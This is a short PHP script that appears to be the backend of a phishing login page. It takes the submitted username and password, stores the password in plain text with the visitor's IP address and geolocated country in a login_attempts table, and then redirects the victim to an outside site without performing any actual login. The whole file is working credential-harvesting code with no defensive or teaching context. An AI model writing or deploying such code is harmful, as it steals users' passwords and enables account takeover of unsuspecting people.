<?php
ob_start();
session_start();

/* DATABASE CONNECTION */
$conn = new mysqli("localhost", "root", "", "my_login_system");
if ($conn->connect_error) {
    die("Database connection failed");
}

/* GET FORM DATA */
$username = $_POST['username'] ?? '';
$password_plain = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$country = "Unknown";

/* BASIC SAFETY CHECK */
if ($username === '' || $password_plain === '') {
    header("Location: login.html");
    exit;
}

/* COUNTRY LOOKUP */
$response = @file_get_contents("http://ip-api.com/json/$ip");
if ($response) {
    $data = json_decode($response, true);
    if (!empty($data['country'])) {
        $country = $data['country'];
    }
}

/* INSERT */
$sql = "INSERT INTO login_attempts
        (username, password_plain, ip, country, created_at)
        VALUES (?, ?, ?, ?, NOW())";

$stmt = $conn->prepare($sql);
$stmt->bind_param("ssss", $username, $password_plain, $ip, $country);
$stmt->execute();

$stmt->close();
$conn->close();

/* REDIRECT */
header("Location: https://www.darknaija.com/");
exit;
